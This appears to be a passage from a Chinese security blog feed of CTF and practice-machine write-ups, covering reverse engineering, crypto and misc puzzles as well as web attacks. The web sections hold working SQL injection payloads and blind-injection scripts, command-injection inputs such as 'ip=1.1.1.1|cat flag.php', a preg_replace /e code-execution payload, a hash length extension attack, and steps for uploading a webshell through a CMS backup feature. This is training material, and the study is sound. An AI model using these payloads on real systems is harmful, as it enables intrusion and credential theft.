        byte[] f2 = decrypt(file1, pass);
        File file2 = new File(&quot;x.jpg&quot;);
        FileOutputStream fos = new FileOutputStream(file2);
        fos.write(f2);
        fos.close();
    &#125;

    public static byte[] decrypt(byte[] x, byte[] y) &#123;
        int i = (byte)y.length;
        byte[] temp = new byte[x.length];
        for(int j = 0; j &lt; x.length; j++) &#123;
            temp[j] = ((byte)(x[j] ^ y[(j % i)]));
        &#125;
        return temp;
    &#125;

    public static byte[] toByteArray(String filename) throws IOException&#123;  

        File f = new File(filename);  
        if(!f.exists())&#123;  
            throw new FileNotFoundException(filename);  
        &#125;  

        ByteArrayOutputStream bos = new ByteArrayOutputStream((int)f.length());  
        BufferedInputStream in = null;  
        try&#123;  
            in = new BufferedInputStream(new FileInputStream(f));  
            int buf_size = 1024;  
            byte[] buffer = new byte[buf_size];  
            int len = 0;  
            while(-1 != (len = in.read(buffer,0,buf_size)))&#123;  
                bos.write(buffer,0,len);  
            &#125;  
            return bos.toByteArray();  
        &#125;catch (IOException e) &#123;  
            e.printStackTrace();  
            throw e;  
        &#125;finally&#123;  
            try&#123;  
                in.close();  
            &#125;catch (IOException e) &#123;  
                e.printStackTrace();  
            &#125;  
            bos.close();  
        &#125;  
    &#125;
&#125;
</code></pre>
<h2 id="10-pyc分析"><a href="#10-pyc分析" class="headerlink" title="10.pyc分析"></a>10.pyc分析</h2><p>–by  NexusHE</p>
<p>本题先给了一个pyc文件，将其反编译后，得到很长一串代码，仔细关系发现其写法类似于函数式编程语言，在根据lambda规则研究之后，代码化简至以下:</p>
<pre><code class="python">#Embedded file name: rev300.py
__g = globals()
__y = (lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())))
string = (__import__(&#39;string&#39;, __g, __g))
table = (string.printable.strip())
&quot;&quot;&quot;
setbit = (lambda p, pos, value: (lambda __l: [ [ [ (lambda __target, __slice, __value: [ (lambda __target, __slice, __value: [ __l[&#39;p&#39;] for __target[__slice] in [(lambda __old: (lambda __ret: (__old | __value if __ret is NotImplemented else __ret))(getattr(__old, &#39;__ior__&#39;, lambda other: NotImplemented)(__value)))(__target[__slice])] ][0])(__l[&#39;p&#39;], __l[&#39;cpos&#39;], __l[&#39;value&#39;] &lt;&lt; __l[&#39;bpos&#39;]) for __target[__slice] in [(lambda __old: (lambda __ret: (__old &amp; __value if __ret is NotImplemented else __ret))(getattr(__old, &#39;__iand__&#39;, lambda other: NotImplemented)(__value)))(__target[__slice])] ][0])(__l[&#39;p&#39;], __l[&#39;cpos&#39;], ~(1 &lt;&lt; __l[&#39;bpos&#39;])) for __l[&#39;bpos&#39;] in [__l[&#39;pos&#39;] % 8] ][0] for __l[&#39;cpos&#39;] in [__l[&#39;pos&#39;] / 8] ][0] for __l[&#39;p&#39;], __l[&#39;pos&#39;], __l[&#39;value&#39;] in [(p, pos, value)] ][0])(&#123;&#125;))
setbit.__name__ = &#39;setbit&#39;
getbit = (lambda p, pos: (lambda __l: [ [ [ __l[&#39;p&#39;][__l[&#39;cpos&#39;]] &gt;&gt; __l[&#39;bpos&#39;] &amp; 1 for __l[&#39;bpos&#39;] in [__l[&#39;pos&#39;] % 8] ][0] for __l[&#39;cpos&#39;] in [__l[&#39;pos&#39;] / 8] ][0] for __l[&#39;p&#39;], __l[&#39;pos&#39;] in [(p, pos)] ][0])(&#123;&#125;))
getbit.__name__ = &#39;getbit&#39;
encode =  (lambda data, buf: (lambda __l: [ [ (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ [ __this() for __l[&#39;data&#39;][__l[&#39;i&#39;]] in [table.index(__l[&#39;data&#39;][__l[&#39;i&#39;]]) + 1] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(xrange(__l[&#39;_len&#39;])), lambda : (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ [ [ __this() for __l[&#39;buf&#39;] in [setbit(__l[&#39;buf&#39;], __l[&#39;i&#39;], getbit(__l[&#39;data&#39;], __l[&#39;j&#39;]))] ][0] for __l[&#39;j&#39;] in [__l[&#39;i&#39;] / 6 * 8 + __l[&#39;i&#39;] % 6] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(xrange(__l[&#39;_len&#39;] * 6)), lambda : __l[&#39;buf&#39;], []), []) for __l[&#39;_len&#39;] in [len(__l[&#39;data&#39;])] ][0] for __l[&#39;data&#39;], __l[&#39;buf&#39;] in [(data, buf)] ][0])(&#123;&#125;))
encode.__name__ = &#39;encode&#39;
&quot;&quot;&quot;
def setbit(p,pos,value):
    bpos = pos % 8
    cpos = pos / 8
    s = p
    s[cpos] = p[cpos] &amp; (~(1 &lt;&lt; bpos))
    s[cpos] = p[cpos] | (value &lt;&lt; bpos)
    return s
def getbit(p,pos):
    bpos = pos % 8
    cpos = pos / 8
    return p[cpos] &gt;&gt; bpos &amp; 1
def encode(data, buf):
    indexdata = []
    for i in xrange(len(data)):
        indexdata.append(table.index(data[i]) + 1)
    res = buf
    for i in xrange(len(data)*6):
        j = i / 6 * 8 + i % 6
        setbit(res, i, getbit(indexdata, j))
    return res
def encrypt():
    fin = open(&#39;key.txt&#39;, &#39;r&#39;)
    s = fin.read().strip()
    fin.close()
    ss = ([])
    sss = ([])
    __items = iter(s)
    __after = (lambda : [ [ (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ (lambda __value: [ __this() for __g[&#39;sssss&#39;] in [(lambda __ret: (__g[&#39;sssss&#39;] + __value if __ret is NotImplemented else __ret))(getattr(__g[&#39;sssss&#39;], &#39;__iadd__&#39;, lambda other: NotImplemented)(__value))] ][0])(chr(c)) for __g[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(ssss), lambda : [ (fout.write(sssss), (fout.close(), None)[1])[1] for __g[&#39;fout&#39;] in [open(&#39;key1.enc&#39;, &#39;wb+&#39;)] ][0], []) for __g[&#39;sssss&#39;] in [&#39;&#39;] ][0] for __g[&#39;ssss&#39;] in [encode(ss, sss)] ][0])
    __sentinel = ([])
    __y(lambda __this: lambda : (lambda __i: ([ (ss.append(c), (sss.append(0), __this())[1])[1] for __g[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))()
</code></pre>
<p>加密的大体规则为把原字符存在table的index+1后，把后6位保存到加密后的文件里。根据此编写解密代码:</p>
<pre><code>def decrypt():
    fin = open(&#39;key.enc&#39;,&#39;rb&#39;)
    cipher = fin.read()
    plain = &#39;&#39;
    def decode3b(s):
        a = s &gt;&gt; 16
        b = (s &gt;&gt; 8) &amp; 0xFF
        c = s &amp; 0xff
        sa = bin(a)[2:].zfill(8)
        sb = bin(b)[2:].zfill(8)
        sc = bin(c)[2:].zfill(8)
        return table[int(sa[2:], 2)] + table[int(sb[4:] + sa[:2], 2)] + table[int(sc[6:] + sb[:4], 2)] + table[int(sc[:6], 2)]
    for i in xrange(0,len(cipher),3):
        s = int(cipher[i:i+3].encode(&#39;hex&#39;),16)
        plain += decode3b(s)
    print plain
    return &#39;&#39;.join(table[(table.index(c) + 63) % 64] for c in plain)
if __name__ == &#39;__main__&#39;:
print decrypt()
</code></pre>
<p>得到</p>
<p>iiiiirrrrLfzea844d181c3249f6gtttggggggg0000000000000</p>
<p>hhhhhqqqqKeyd9733c070b2138e5fsssfffffff”””””””””””””</p>
<p>去掉乱码及一个冒号变成”d“，flag为key之后的一串字符串:</p>
<p>9733c070b2138e5f</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次靶机的尝试</title>
    <url>/2017/03/26/di-yi-ci-ba-ji-de-chang-shi/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一组的表哥们搭了个靶机，这下有的玩了。</p>
<a id="more"></a>

<h2 id="收集数据"><a href="#收集数据" class="headerlink" title="收集数据"></a>收集数据</h2><p>​    较老版本的南方数据建站系统，漏洞应该不少，也应该有0day，查一下，直接用.</p>
<p>在搜索页面存在注入。过两天手注去。</p>
<pre><code>news_search.asp?key=7%&#39; union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin where 1 or &#39;%&#39;=&#39;&amp;otype=title&amp;Submit=%CB%D1%CB%F7</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170326/180018566.png" alt="mark"></p>
<p>把password丢去md5解密，得到admin—admin888;进入后台管理系统</p>
<h2 id="传马"><a href="#传马" class="headerlink" title="传马"></a>传马</h2><p>​    因为网站代码闭合有问题，所以在网站介绍之类的信息中插入一句话会崩溃。回来再试试。</p>
<p>​    后台可以传文件，但是限制类型，asp后缀的传不上去。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170326/180655654.png" alt="mark"></p>
<p>​    但是它还有数据库备份功能，将大马后缀改为jpg，上传后会给出图片所在路径，通过数据库备份功能，数据库路径改为文件地址，将图片备份，这里将备份名字写<code>qwe.asp</code>，备份返回路径是asa后缀，去掉asa后缀，直接访问就好了。</p>
<h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><p>因为靶机又被玩坏了==，所以先到这了，也没法截图。恢复后再补。。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>火种CTF WriteUp</title>
    <url>/2017/07/03/huo-chong-ctf-writeup/</url>
    <content><![CDATA[<h1 id="火种CTF-WriteUp"><a href="#火种CTF-WriteUp" class="headerlink" title="火种CTF WriteUp"></a>火种CTF WriteUp</h1><p>​                                                                ——-By  LANVNAL</p>
<h2 id="0X01-Web"><a href="#0X01-Web" class="headerlink" title="0X01 Web"></a>0X01 Web</h2><ul>
<li><h3 id="第二个web"><a href="#第二个web" class="headerlink" title="第二个web"></a>第二个web</h3><p>http头注入加基于时间的盲注。</p>
</li>
</ul>
<pre><code>#-*-coding:utf-8-*-
import requests
import string
url=&quot;http://aim.zhugeaq.com:82/&quot;
payloads=string.lowercase + string.uppercase + string.digits+&#39;&#123;&#39;+&#39;&#125;&#39;
flag=&quot;&quot;

for i in range(1,100):
    havetry=0
    for str in payloads:
        headers=&#123;&quot;x-forwarded-for&quot;:&quot;&#39; +(select case when (substring((select flag from flag ) from %d for 1 )=&#39;%s&#39;) then sleep(7) else 1 end ) and &#39;1&#39;=&#39;1&quot; %(i,str)&#125;
        try: 
            res=requests.get(url,headers=headers,timeout=7)
        except requests.exceptions.ReadTimeout, e:
            havetry=1
            flag = flag + str
            print &quot;flag:&quot;, flag
            break
    if havetry==0:
        break
print &#39;flag:&#39; + flag</code></pre>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul>
<li><h3 id="passwd-is-flag"><a href="#passwd-is-flag" class="headerlink" title="passwd is flag"></a>passwd is flag</h3></li>
</ul>
<pre><code># -*- coding: utf-8 -*-
import requests
url = &#39;http://aim.zhugeaq.com:83/&#39;
def check(payload):
    postdata = &#123;&#39;username&#39;:&#39;1&#39;,&#39;password&#39;:payload&#125;
    r = requests.post(url, postdata).content
    return &#39;admin_r&#39; in r

password  = &#39;flag&#123;9&#39;
s = r&#39;0123456789:abcdefg|~&#39;
for t in xrange(33):
    for i in s:
        payload = &#39;1\&#39; or 1 union select 1,2,\&#39;%s\&#39; order by 3#&#39; % (password+i)
        if check(payload):
            password = password + chr(ord(i)-1)
            print password
            break</code></pre>
<ul>
<li><h3 id="第四个Web"><a href="#第四个Web" class="headerlink" title="第四个Web"></a>第四个Web</h3><p>命令执行，限制长度，1.1.1.1这样就符合条件的情况下缩短长度，再|加上命令就好。</p>
<blockquote>
<p>ip=1.1.1.1|ls</p>
<p>ip=1.1.1.1|cat flag.php</p>
</blockquote>
</li>
</ul>
<ul>
<li><h3 id="最后一个Web"><a href="#最后一个Web" class="headerlink" title="最后一个Web"></a>最后一个Web</h3><p>burpsuit抓包，post传参。Fuzz测试，过滤掉了<code>or # - 空格 % ...   </code>,可用<code>= () &#39;&#39;</code>,进行布尔盲注。</p>
</li>
</ul>
<pre><code># -*- coding: utf-8 -*-
import requests
url = &#39;http://aim.zhugeaq.com:85/01/login.php&#39;
def check(payload):
    postdata = &#123;&#39;username&#39;:payload,&#39;pass&#39;:&#39;xx&#39;&#125;
    r = requests.post(url, postdata).content
    return &#39;密码错误&#39; in r

password  = &#39;&#39;
s = r&#39;0123456789abcdef&#39;

for i in xrange(32,0,-1):
    for c in s:
        payload = &#39;\&#39;=(mid((select(pass)from(admin))from(%d))=\&#39;%s\&#39;)=\&#39;0&#39; % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password</code></pre>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ul>
<li><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3></li>
</ul>
<blockquote>
<p>对应字母替换，根据第一行替换得出的字母表就能看出这是rot13，直接对应rot13的脚本得出flag。</p>
</blockquote>
<pre><code>#jrecbi]gyu8
e.u pry(owRuuo.yQ)S
    e.u &#123;pry(jd)S
        ypfS
            aoj ] rpe(jd)
        .qj.lyS
            p.ygpb jd
        cu (aoj V 96) abe (aoj W 123)S
            p.ygpb jdp((aoj[97&#125;Ruuo.yQ)v&#123;&#123;mre&#123;&#123;(26) &#125; 97)
        .ncu (aoj V 64) abe (aoj V 91)S
            p.ygpb jdp((aoj[65&#125;Ruuo.yQ)v&#123;&#123;mre&#123;&#123;(26) &#125; 65)
        .no.S
            p.ygpb jd

    p.ygpb --vhrcb(/&#123;pry( j ) urp j cb o=)

lpcby pry( -qpn?popbpo.+-w 13 )

////////////////////////////
key&#123;efeaefr&#125;
////////////////////////////
# -*- coding: utf-8 -*-             &lt;--------入手点
def rot(s,OffsetX):
    def _rot(ch):
        try:
            asc = ord(ch)
        except:
            return ch
        if (asc &gt; 96) and (asc &lt; 123):
            return chr((asc-97+OffsetX).__mod__(26) + 97)
        elif (asc &gt; 64) and (asc &lt; 91):
            return chr((asc-65+OffsetX).__mod__(26) + 65)
        else:
            return ch

    return &#39;&#39;.join([_rot( c ) for c in s])</code></pre>
<ul>
<li><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>binwalk提取–&gt;得到压缩包–&gt;解压。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/010324040.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="我心永恒"><a href="#我心永恒" class="headerlink" title="我心永恒"></a>我心永恒</h3><p>音频隐写</p>
<p>mp3stego提取。密码在文件中搜索，flag在输出的txt文件中。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/011100377.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/011114406.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="截获一个文件"><a href="#截获一个文件" class="headerlink" title="截获一个文件"></a>截获一个文件</h3><p>编辑器查看文件–&gt;base64解密</p>
</li>
</ul>
<ul>
<li><h3 id="找key"><a href="#找key" class="headerlink" title="找key"></a>找key</h3><p>图片改格式为zip，是伪加密，修改后解压出第二张图片，pngcheck检查后发现IEND块后有附加数据，WinHex打开,最后面的字符串凯撒位移。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/011710014.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="找鼹鼠"><a href="#找鼹鼠" class="headerlink" title="找鼹鼠"></a>找鼹鼠</h3><p>一个压缩文件，解压后binwalk分析看到了ext，直接挂载查看到flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/013656052.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="无线"><a href="#无线" class="headerlink" title="无线"></a>无线</h3><p>加密的RAR压缩文件–&gt;爆破得密码12345–&gt;wireshark分析</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/014252986.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="海贼王"><a href="#海贼王" class="headerlink" title="海贼王"></a>海贼王</h3><p>foremost从Thums.db提取出2张图片，flag藏在题目给出的一堆图片里和这2张一样的一张里。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/014847131.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/014903597.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="这是什么"><a href="#这是什么" class="headerlink" title="这是什么"></a>这是什么</h3><p>编辑器打开，有一串字符，HTML实体编码。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/015224308.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/015243539.png" alt="mark"></p>
</li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3></li>
</ul>
<blockquote>
<p>\u606d\u559c\u60a8\uff01\u006b\u0065\u0079\u007b\u0074\u0068\u0065\u0020\u0066\u0069\u0072\u0073\u0074\u0020\u006b\u0065\u0079\u007d</p>
</blockquote>
<p>​    在线转换即可。（<a href="http://www.msxindl.com/tools/unicode16.asp%EF%BC%89">http://www.msxindl.com/tools/unicode16.asp）</a></p>
<ul>
<li><h3 id="Base64-32"><a href="#Base64-32" class="headerlink" title="Base64+32"></a>Base64+32</h3></li>
</ul>
<blockquote>
<p>Tk5TWFM2M0pPTlJXR1kzR09KVEdPNURCTVZUR0NaM1NOQjJIMj09PQ== </p>
</blockquote>
<p>​    Base64+32解密</p>
<ul>
<li><h3 id="凯撒"><a href="#凯撒" class="headerlink" title="凯撒"></a>凯撒</h3></li>
</ul>
<blockquote>
<p>我来，我见，我征服 e6Z9i<del>]8R</del>U<del>QHE{RnY{QXg</del>QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA</p>
</blockquote>
<p>​    脚本跑出来base64，再解base64.</p>
<ul>
<li><h3 id="费娜姆密码"><a href="#费娜姆密码" class="headerlink" title="费娜姆密码"></a>费娜姆密码</h3></li>
</ul>
<blockquote>
<p>二战时盟军截获德军一段密码，密文为：00000100001000001101000001100001010（密钥：large）</p>
</blockquote>
<blockquote>
<p>异或加密</p>
<p>00000100001000001101000001100001010</p>
<p>然后密钥large，转换成7位的ASCII：11011001100001111001011001111100101</p>
<p>异或操作</p>
<p>0110111001101001011010000110000101101111</p>
<p>ASCII转换成字符：nihao</p>
<p>key{nihao}</p>
<p><a href="http://www.360doc.com/content/15/0222/14/21874787_450053353.shtml">http://www.360doc.com/content/15/0222/14/21874787_450053353.shtml</a></p>
</blockquote>
<ul>
<li><h3 id="MD5爆破"><a href="#MD5爆破" class="headerlink" title="MD5爆破"></a>MD5爆破</h3></li>
</ul>
<blockquote>
<p>小明入侵网站后获得了管理员的密文，由于太高兴了手一抖把密文删除了一部分，只剩下前10位d9ddd1800f，小明根据社工知道管理员的密码习惯是4位的数字加字母，你能帮小明恢复密码的哈希值吗？（提示：flag为密码的哈希值）</p>
</blockquote>
<pre><code># -*- coding:utf-8 -*- 
import hashlib
import string
md5=&#39;d9ddd1800f&#39;
s=string.lowercase + string.uppercase + string.digits
for a in s:
    for b in s:
        for c in s:
            for d in s:
                st=a+b+c+d
                flag=hashlib.md5(st).hexdigest()
                if(flag[0:10]==md5[0:10]):
                    print flag
                    break</code></pre>
<ul>
<li><h3 id="hash破解"><a href="#hash破解" class="headerlink" title="hash破解"></a>hash破解</h3></li>
</ul>
<blockquote>
<p>你猜这是什么东西，记得破解后把其中的密码给我。 00031141:Administrator:s1riu5:C6AE3F7D7534AE05AAD3B435B51404EE:65D4F6EC4BE18E14F3665804EF1E9496（答案为非常规形式）</p>
</blockquote>
<p>​    在线解密（<a href="http://www.objectif-securite.ch/ophcrack.php%EF%BC%89">http://www.objectif-securite.ch/ophcrack.php）</a></p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><h3 id="注册码"><a href="#注册码" class="headerlink" title="注册码"></a>注册码</h3></li>
</ul>
<blockquote>
<p>T君注册了一个软件，用户名为anyuntec，但是走着走着摔了一跤，爬起来一想，注册码给忘了，你能帮助T君找出注册码吗？</p>
</blockquote>
<p>IDA反编译后看主要代码，就是要求注册码对于用户名每一位后移8-i(i从0递增)。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/020100031.png" alt="mark"></p>
<ul>
<li><h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>将paramString1的值MD5加密，每隔2个字符取一个字符，最后拼起来就是flag。</p>
</li>
</ul>
<pre><code>import hashlib

par1 = b&quot;Tenshine&quot;

def checkSN(par1):
    if par1:
        # if par2 and len(par2) == 22:  
        m2 = hashlib.md5()   
        m2.update(par1)   
        par1_md5 = m2.hexdigest()
        print(par1_md5)
        par1 = toHexString(par1_md5)
        print(par1)
        what = &quot;&quot;
        i = 0
        while i &lt; len(par1_md5):
            what += par1_md5[i]
            i += 2
        print(&quot;flag&#123;&quot;+ what +&quot;&#125;&quot;)


def toHexString(s):
    lst = &quot;&quot;
    for ch in s:
        hv = hex(ord(ch)).replace(&#39;0x&#39;, &#39;&#39;)
        if len(hv) == 1:
            hv = &#39;0&#39;+hv
        lst += hv
    return lst

checkSN(par1)</code></pre>
<ul>
<li><h3 id="简单的PE逆向"><a href="#简单的PE逆向" class="headerlink" title="简单的PE逆向"></a>简单的PE逆向</h3><p>查看字符串发现异常，跳转查看代码。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/021302538.png" alt="mark"></p>
</li>
</ul>
<pre><code> memset(&amp;v1, 0xCCu, 0x194u);
  v33 = (unsigned int)&amp;savedregs ^ dword_417000;
  v26 = 0;
  v4 = 1;
  v5 = 4;
  v6 = 14;
  v7 = 10;
  v8 = 5;
  v9 = 36;
  v10 = 23;
  v11 = 42;
  v12 = 13;
  v13 = 19;
  v14 = 28;
  v15 = 13;
  v16 = 27;
  v17 = 39;
  v18 = 48;
  v19 = 41;
  v20 = 42;
  v21 = 26;
  v22 = 20;
  v23 = 59;
  v24 = 4;
  v25 = 0;
  printf(&quot;please enter flag:&quot;);
  sub_411136();
  while ( 1 )
  &#123;
    getch();
    v1 = sub_411136();
    v27[v26] = v1;
    if ( !(_BYTE)v1 || v27[v26] == 13 )
      break;
    if ( v27[v26] == 8 )
    &#123;
      printf(&quot;\b\b&quot;);
      sub_411136();
      --v26;
    &#125;
    else
    &#123;
      printf(&quot;%c&quot;, v27[v26]);
      sub_411136();
      ++v26;
    &#125;
  &#125;
  v3 = 0;
  for ( i = 0; i &lt; 17; ++i )
  &#123;
    if ( v27[i] != byte_415768[*(&amp;v4 + i)] )
      v3 = 1;
  &#125;
  if ( v28 != 49 || v29 != 48 || v30 != 50 || v31 != 52 || v32 != 125 )
    v3 = 1;
  v27[v26] = 0;
  printf(&quot;\r\n&quot;);
  sub_411136();
  if ( v3 )
  &#123;
    printf(&quot;wrong\n&quot;);
    sub_411136();
    sub_41113B();
  &#125;
  else
  &#123;
    printf(&quot;success\n&quot;);
    sub_411136();
  &#125;
  system(&quot;pause&quot;);
  sub_411136();
  sub_411082(&amp;savedregs, &amp;dword_411678);
  sub_411014(v1);
  return sub_411136();
&#125;</code></pre>
<blockquote>
<p>语句<code>byte_415768[(&amp;v4 + i)]</code>中&amp;v4表示取变量v4的地址，i从0变到17，那么byte_41576[]中的序号依次为v4,v5,v6,….v21，共17个变量的值，即v4 = 1，v5 = 4，v6 = 14，v7 = 10，v8 = 5，v9 = 36，v10 = 23，v11 = 42， v12 = 13，v13 = 19，v14 = 28，v15 = 13，v16 = 27，v17 = 39，v18 = 48，v19 = 41，v20 = 42，v21 = 26这些。 </p>
</blockquote>
<pre><code>v=&#39;&#39;
s=&#39;KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&#39;
a=(1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42)
for i in range(0,17):
    v=v+s[a[i]-1:a[i]]
print v</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第十一周小组WriteUp</title>
    <url>/2017/05/21/di-shi-yi-zhou-xiao-zu-writeup/</url>
    <content><![CDATA[<h1 id="第十一周小组WriteUp"><a href="#第十一周小组WriteUp" class="headerlink" title="第十一周小组WriteUp"></a>第十一周小组WriteUp</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Preg（200）"><a href="#1-Preg（200）" class="headerlink" title="1.Preg（200）"></a>1.Preg（200）</h3><pre><code>&lt;?php 
error_reporting(0); 
require_once(&quot;flag.php&quot;); 
if(!$passwd) 
&#123; 
  $passwd=$_POST[&quot;passwd&quot;]; 
&#125; 
if(!$lockedtxt) 
&#123; 
  $lockedtxt=$_POST[&quot;lockedtxt&quot;]; 
&#125; 
function flag($var) 
&#123; 
  echo $var; 
&#125; 
if($key) 
&#123; 
  $unlockedtxt=preg_replace($passwd,$key,$lockedtxt); 
&#125; 
if($unlockedtxt===$flag) 
&#123; 
  flag(&quot;The Correct: &quot;); 
  flag($flag); 
&#125; 

show_source(&quot;index.php&quot;); 
// key=flag(\\1) 
 ?&gt; </code></pre>
<p>​    preg_replace()函数的漏洞导致代码执行。</p>
<blockquote>
<p>前提：</p>
<p>01：第一个参数需要e标识符，有了它可以执行第二个参数的命令</p>
<p>02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令</p>
</blockquote>
<p>​    这个题第二个参数不是可以传的，是预先设定好的，但是<code>\\1</code>为第一参数里正则表达试匹配后的值,还是执行了第四个参数的语句。</p>
<blockquote>
<p>paload：</p>
<p>passwd=/1(.*?)1/e&amp;lockedtxt=1$flag1</p>
<p>passwd=/(.*)/e&amp;lockedtxt=$flag都行，不唯一</p>
</blockquote>
<p>参考：</p>
<blockquote>
<p><a href="http://www.php.net/manual/zh/function.preg-replace.php">http://www.php.net/manual/zh/function.preg-replace.php</a></p>
<p><a href="http://www.2cto.com/article/201212/178024.html">http://www.2cto.com/article/201212/178024.html</a></p>
<p><a href="http://simeon.blog.51cto.com/18680/9895/">http://simeon.blog.51cto.com/18680/9895/</a></p>
<p><a href="https://www.waitalone.cn/phpmyadmin-preg_replace-rce.html">https://www.waitalone.cn/phpmyadmin-preg_replace-rce.html</a></p>
</blockquote>
<h3 id="2-Hash（200）"><a href="#2-Hash（200）" class="headerlink" title="2.Hash（200）"></a>2.Hash（200）</h3><pre><code>
&lt;h1&gt;hello ctfer!&lt;h1&gt;&lt;!--&lt;?php
error_reporting(0);
$flag = &quot;xxxxxxxx&quot;;
$secret = &quot;xxxxxxxxxxxxxxxxxxxxxxxxx&quot;; // This secret is 15 characters long for security!

$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;
        if ($_COOKIE[&quot;getmein&quot;] == md5($secret . urldecode($username . $password))) &#123;
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        &#125;
        else &#123;
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        &#125;
    &#125;
    else &#123;
        die (&quot;You are not an admin! LEAVE.&quot;);
    &#125;
&#125;

setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));

echo &quot;&lt;h1&gt;hello ctfer!&lt;h1&gt;&quot;;
--&gt;</code></pre>
<p>哈希长度扩展攻击。</p>
<p>上工具。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/160421906.png" alt="mark"></p>
<p>Input Si gnature:填名为sample-hash的cookie的值，题目已给出。</p>
<p>Input Data:填admin</p>
<blockquote>
<p>$secret是密文，长度为15，如果再算上后面第一个admin，长度就是20<br>而数据是admin<br>签名（哈希值）是be7413992c7e8541aa530688ddbbcc00</p>
</blockquote>
<p>Input Data to Add:随意</p>
<p>生成了：</p>
<pre><code>b1700910c22d838ea2615091520a13f3
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00qwe</code></pre>
<p>第一行是新的哈希值，将其设置为新cookie(getmein)的值，第二行的数据将<code>\x</code>换成%在post提交。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/161315507.png" alt="mark"></p>
<p>资料：</p>
<blockquote>
<p><a href="http://www.cnblogs.com/pcat/p/5478509.html">http://www.cnblogs.com/pcat/p/5478509.html</a></p>
<p><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></p>
<p><a href="https://github.com/bwall/HashPump(%E6%89%80%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7HashPump)">https://github.com/bwall/HashPump(所用的工具HashPump)</a></p>
</blockquote>
